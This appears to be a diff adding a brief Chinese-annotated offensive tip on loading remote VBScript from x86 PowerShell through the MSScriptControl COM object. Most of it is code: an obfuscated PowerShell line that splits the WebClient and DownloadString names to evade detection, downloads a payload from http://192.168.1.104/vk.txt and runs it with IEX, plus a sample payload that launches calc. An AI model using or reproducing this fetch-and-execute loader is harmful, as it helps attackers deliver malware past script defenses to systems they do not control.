@@ -1,0 +1,18 @@
+条件：
+1.使用powershell x86位置的
+
+#远程加载vbs的一个例子
+$vbs = New-Object -ComObject 'MSScriptControl.ScriptControl';
+$vbs.Language = 'VBScript';
+$text='(&(GCM *W-O*)Ne'+'t.We'+'bCl'+'ient).Dow'+'nloa'+'dSt'+'ring(''http://192.168.1.104/vk.txt'').replace(''MmM'','' '')'|IEX; //下载192.168.1.104/vk.txt的vbs代码
+$vbs.Timeout=-1;
+$vbs.AddCode($text) //运行vbs代码
+
+
+#vk.txt里的内容
+Set obj = createobject("wscript.shell")
+obj.run "calc"
+
+
+#更多操作
+https://www.leeholmes.com/blog/2008/03/28/bgshell-background-shell/
